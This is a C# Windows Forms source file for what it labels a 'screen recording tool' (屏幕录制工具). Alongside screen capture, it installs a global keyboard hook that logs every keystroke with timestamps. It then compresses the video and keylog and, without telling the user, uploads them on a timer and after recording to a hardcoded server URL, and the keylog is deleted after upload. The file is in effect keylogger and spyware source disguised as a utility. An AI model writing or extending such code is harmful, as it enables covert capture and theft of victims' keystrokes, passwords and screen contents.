using System;
using System.Drawing;
using System.IO;
using System.Windows.Forms;
using System.Threading.Tasks;
using System.Timers;

namespace ScreenRecorder
{
    public partial class MainForm : Form
    {
        private bool isRecording = false;
        private KeyboardHook? keyboardHook;
        private StreamWriter? keylogWriter;
        private string? keylogPath;
        private System.Windows.Forms.Timer? screenCaptureTimer;
        private Rectangle screenBounds;
        private string? videoOutputPath;
        private int frameRate = 10; // 默认帧率
        private int videoQuality = 20; // 视频质量参数，范围0-100

        // 功能类实例
        private ScreenRecorder? screenRecorder;
        private FileCompressor? fileCompressor;
        private FileUploader? fileUploader;
        private AutoUploadTimer? autoUploadTimer;
        private string remoteServerUrl = "http://192.168.79.28:5198/api/upload/file"; // 远程存储服务器地址

        public MainForm()
        {
            InitializeComponent();
            screenBounds = Screen.PrimaryScreen.Bounds;
            keyboardHook = new KeyboardHook();
            keyboardHook.KeyPressed += KeyboardHook_KeyPressed;
        }

        private void InitializeComponent()
        {
            this.btnStartStop = new Button();
            this.lblStatus = new Label();
            this.trackBarQuality = new TrackBar();
            this.lblQuality = new Label();
            this.SuspendLayout();
            
            // btnStartStop
            this.btnStartStop.Location = new Point(12, 12);
            this.btnStartStop.Name = "btnStartStop";
            this.btnStartStop.Size = new Size(120, 30);
            this.btnStartStop.TabIndex = 0;
            this.btnStartStop.Text = "开始录制";
            this.btnStartStop.UseVisualStyleBackColor = true;
            this.btnStartStop.Click += new EventHandler(this.btnStartStop_Click);
            
            // lblStatus
            this.lblStatus.AutoSize = true;
            this.lblStatus.Location = new Point(12, 54);
            this.lblStatus.Name = "lblStatus";
            this.lblStatus.Size = new Size(77, 15);
            this.lblStatus.TabIndex = 1;
            this.lblStatus.Text = "状态: 就绪";
            
            // trackBarQuality
            this.trackBarQuality.Location = new Point(12, 90);
            this.trackBarQuality.Name = "trackBarQuality";
            this.trackBarQuality.Size = new Size(250, 45);
            this.trackBarQuality.TabIndex = 2;
            this.trackBarQuality.Minimum = 1;
            this.trackBarQuality.Maximum = 100;
            this.trackBarQuality.Value = 20;
            this.trackBarQuality.Scroll += new EventHandler(this.trackBarQuality_Scroll);
            
            // lblQuality
            this.lblQuality.AutoSize = true;
            this.lblQuality.Location = new Point(12, 76);
            this.lblQuality.Name = "lblQuality";
            this.lblQuality.Size = new Size(84, 15);
            this.lblQuality.TabIndex = 3;
            this.lblQuality.Text = "视频质量: 20";
            
            // MainForm
            this.ClientSize = new Size(284, 140);
            this.Controls.Add(this.lblQuality);
            this.Controls.Add(this.trackBarQuality);
            this.Controls.Add(this.lblStatus);
            this.Controls.Add(this.btnStartStop);
            this.Name = "MainForm";
            this.Text = "屏幕录制工具";
            this.FormClosing += new FormClosingEventHandler(this.MainForm_FormClosing);
            this.ResumeLayout(false);
            this.PerformLayout();
        }

        private void btnStartStop_Click(object sender, EventArgs e)
        {
            if (!isRecording)
            {
                StartRecording();
            }
            else
            {
                StopRecording();
            }
        }

        private void StartRecording()
        {
            try
            {
                // 创建输出目录（使用当前应用程序目录）
                string appDirectory = AppDomain.CurrentDomain.BaseDirectory;
                string captureFolder = Path.Combine(appDirectory, "ScreenCaptures");
                Directory.CreateDirectory(captureFolder);
                
                // 设置视频输出路径
                string timestamp = DateTime.Now.ToString("yyyy-MM-dd_HH-mm-ss");
                keylogPath = Path.Combine(captureFolder, $"KeyLog_{timestamp}.txt");
                videoOutputPath = Path.Combine(captureFolder, $"ScreenRecording_{timestamp}.avi");

                // 初始化键盘记录
                keylogWriter = new StreamWriter(keylogPath);
                keylogWriter.WriteLine($"键盘记录开始于: {DateTime.Now}");
                keylogWriter.Flush();

                // 初始化屏幕录制器
                screenRecorder = new ScreenRecorder();
                screenRecorder.SetFrameRate(frameRate);
                screenRecorder.SetVideoQuality(videoQuality);
                screenRecorder.StartRecording(videoOutputPath);

                // 初始化文件压缩器和上传器
                fileCompressor = new FileCompressor();
                fileUploader = new FileUploader();

                // 启动屏幕捕获定时器
                screenCaptureTimer = new System.Windows.Forms.Timer();
                screenCaptureTimer.Interval = 1000 / frameRate; // 根据帧率设置间隔
                screenCaptureTimer.Tick += ScreenCaptureTimer_Tick;
                screenCaptureTimer.Start();

                // 启动键盘钩子
                keyboardHook?.Start();

                // 初始化并启动自动上传定时器
                InitializeAutoUploadTimer();

                isRecording = true;
                btnStartStop.Text = "停止录制";
                lblStatus.Text = "状态: 录制中...";
            }
            catch (Exception ex)
            {
                MessageBox.Show($"启动录制时出错: {ex.Message}", "错误", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private async void StopRecording()
        {
            try
            {
                // 停止屏幕捕获
                if (screenCaptureTimer != null)
                {
                    screenCaptureTimer.Stop();
                    screenCaptureTimer.Dispose();
                    screenCaptureTimer = null;
                }

                // 停止键盘钩子
                keyboardHook?.Stop();

                // 关闭键盘记录文件
                if (keylogWriter != null)
                {
                    keylogWriter.WriteLine($"键盘记录结束于: {DateTime.Now}");
                    keylogWriter.Close();
                    keylogWriter = null;
                }

                // 停止并释放屏幕录制器
                screenRecorder?.StopRecording();

                // 停止并释放自动上传定时器
                autoUploadTimer?.Stop();
                autoUploadTimer = null;
                
                isRecording = false;
                btnStartStop.Text = "开始录制";
                lblStatus.Text = "状态: 就绪";

                // 录制完成后直接保存，不显示对话框
                // 执行压缩和上传功能
                if (fileCompressor != null && fileUploader != null && !string.IsNullOrEmpty(videoOutputPath) && !string.IsNullOrEmpty(keylogPath))
                {
                    try
                    {
                        // 在后台线程中执行压缩和上传，避免阻塞UI线程
                        await Task.Run(async () =>
                        {
                            try
                            {
                                // 等待一段时间确保文件句柄被释放
                                await Task.Delay(100);

                                // 执行异步压缩
                                string zipFilePath = await fileCompressor.CompressFilesForAutoUploadAsync(videoOutputPath, keylogPath);
                                
                                if (!string.IsNullOrEmpty(zipFilePath))
                                {
                                    // 等待一段时间确保压缩文件句柄被释放
                                    await Task.Delay(100);

                                    // 执行上传到服务器，并传递键盘记录文件路径以便在上传完成后删除
                                    await fileUploader.UploadToRemoteServerAsync(zipFilePath, keylogPath);
                                }
                            }
                            catch (Exception ex)
                            {
                                // 在UI线程上显示错误消息
                                this.BeginInvoke((MethodInvoker)delegate
                                {
                                    MessageBox.Show($"压缩或上传过程中出错: {ex.Message}", "错误", MessageBoxButtons.OK, MessageBoxIcon.Error);
                                });
                            }
                        });
                    }
                    catch (Exception ex)
                    {
                        MessageBox.Show($"启动后台任务时出错: {ex.Message}", "错误", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show($"停止录制时出错: {ex.Message}", "错误", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void ScreenCaptureTimer_Tick(object? sender, EventArgs e)
        {
            try
            {
                // 捕获屏幕
                screenRecorder?.CaptureFrame();

                // 更新状态
                lblStatus.Text = $"状态: 正在录制 (已捕获 {screenRecorder?.FrameCount} 帧)";
            }
            catch (Exception ex)
            {
                MessageBox.Show($"捕获屏幕时出错: {ex.Message}", "错误", MessageBoxButtons.OK, MessageBoxIcon.Error);
                StopRecording();
            }
        }

        private void KeyboardHook_KeyPressed(object sender, KeyPressedEventArgs e)
        {
            if (keylogWriter != null)
            {
                keylogWriter.WriteLine($"[{DateTime.Now:HH:mm:ss.fff}] Key: {e.Key}, Modifiers: {e.Modifiers}");
                keylogWriter.Flush();
            }
        }

        private void MainForm_FormClosing(object sender, FormClosingEventArgs e)
        {
            if (isRecording)
            {
                StopRecording();
            }
        }

        private void trackBarQuality_Scroll(object sender, EventArgs e)
        {
            if (sender is TrackBar trackBar)
            {
                videoQuality = trackBar.Value;
                lblQuality.Text = $"视频质量: {videoQuality}";
            }
        }

        // 初始化自动上传定时器
        private void InitializeAutoUploadTimer()
        {
            autoUploadTimer = new AutoUploadTimer(fileCompressor, fileUploader);
            autoUploadTimer.AutoUploadRequired += AutoUploadTimer_AutoUploadRequired;
            autoUploadTimer.Initialize();
        }

        // 自动上传需要事件处理
        private async void AutoUploadTimer_AutoUploadRequired(object? sender, EventArgs e)
        {
            if (isRecording)
            {
                try
                {
                    // 创建新的录制文件继续录制
                    if (keylogWriter != null)
                    {
                        keylogWriter.WriteLine($"自动上传点: {DateTime.Now}");
                        keylogWriter.Flush();
                    }

                    // 停止当前录制
                    screenRecorder?.StopRecording();

                    // 执行自动上传（异步方式，不会阻塞UI线程）
                    if (autoUploadTimer != null && videoOutputPath != null && keylogPath != null)
                    {
                        await autoUploadTimer.PerformAutoUploadAsync(videoOutputPath, keylogPath);
                    }

                    // 创建新的录制文件继续录制
                    CreateNewRecordingFiles();

                    // 记录自动上传完成
                    if (keylogWriter != null)
                    {
                        keylogWriter.WriteLine($"自动上传完成: {DateTime.Now}");
                        keylogWriter.Flush();
                    }
                }
                catch (Exception ex)
                {
                    MessageBox.Show($"自动上传过程中出错: {ex.Message}", "错误", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            }
        }

        // 创建临时文件用于继续录制
        public void CreateNewRecordingFiles()
        {
            try
            {
                // 创建新的视频文件继续录制
                string newTimestamp = DateTime.Now.ToString("yyyy-MM-dd_HH-mm-ss");
                string captureFolder = Path.GetDirectoryName(videoOutputPath);
                
                // 创建新的键盘记录文件
                string newKeylogPath = Path.Combine(captureFolder, $"KeyLog_{newTimestamp}_Part.txt");
                keylogWriter = new StreamWriter(newKeylogPath, true); // 追加模式
                keylogWriter.WriteLine($"继续录制: {DateTime.Now}");
                keylogWriter.Flush();
                
                // 创建新的视频文件
                string newVideoPath = Path.Combine(captureFolder, $"ScreenRecording_{newTimestamp}_Part.avi");
                
                // 保存新的路径
                keylogPath = newKeylogPath;
                videoOutputPath = newVideoPath;
                
                // 重新初始化屏幕录制器并开始录制
                screenRecorder = new ScreenRecorder();
                screenRecorder.SetFrameRate(frameRate);
                screenRecorder.SetVideoQuality(videoQuality);
                screenRecorder.StartRecording(videoOutputPath);
            }
            catch (Exception ex)
            {
                MessageBox.Show($"创建新录制文件时出错: {ex.Message}", "错误", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        // 异步上传文件方法
        private async void UploadFileAsync(string zipFilePath)
        {
            try
            {
                // 设置远程服务器URL
                if (fileUploader != null)
                {
                    fileUploader.RemoteServerUrl = remoteServerUrl;
                    await fileUploader.UploadToRemoteServerAsync(zipFilePath);
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show($"上传过程中出错: {ex.Message}", "错误", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private Button btnStartStop = null!;
        private Label lblStatus = null!;
        private TrackBar trackBarQuality = null!;
        private Label lblQuality = null!;
    }
}